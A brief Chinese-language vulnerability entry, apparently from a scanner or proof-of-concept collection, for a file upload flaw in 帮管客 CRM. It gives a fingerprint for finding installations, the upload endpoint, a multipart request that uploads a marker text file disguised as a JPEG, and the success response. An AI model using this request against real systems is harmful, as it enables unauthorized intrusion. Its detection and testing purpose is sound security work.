# 帮管客CRM文件上传漏洞

帮管客CRM ｜ 文件上传 ｜ —
- **指纹**：`app="帮管客-CRM"`
- **请求**：`POST /index.php/upload/ajax_upload HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryv1WbOn5o
Content-Disposition: form-data; name="file"; filename="dudesite.txt"
Content-Type: image/jpeg
dudesite
------WebKitFormBoundaryv1WbOn5o--
```
- **响应特征**：200 dudesite.txt